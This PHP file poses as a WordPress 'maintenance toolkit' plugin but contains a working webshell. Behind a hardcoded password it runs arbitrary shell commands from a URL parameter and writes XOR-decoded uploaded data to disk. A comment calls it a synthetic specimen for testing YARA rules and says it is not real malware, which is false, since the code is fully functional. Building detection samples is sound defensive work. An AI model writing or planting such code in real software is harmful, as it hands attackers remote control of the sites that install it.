<?php
/*
Plugin Name: wp_zmfjlow
Description: Small maintenance toolkit: keeps option storage tidy.
Version: 2.9.2
*/
// Synthetic specimen — OffSeq compact webshell variant
// This is NOT real malware; it is a minimal structure that exercises YARA rule logic.
if (isset($_GET['postpass2'])) { echo 'OK'; exit; }
if ($_GET['root'] !== 'admin888') { die(); }
$key = 'myXorSecret';
if (isset($_GET['cmd'])) { system($_GET['cmd']); }
if (isset($_POST['b64data'])) {
    $data = base64_decode($_POST['b64data']);
    for ($i = 0; $i < strlen($data); $i++) {
        $data[$i] = $data[$i] ^ $key[$i % strlen($key)];
    }
    file_put_contents(basename($_POST['fn']), $data);
}
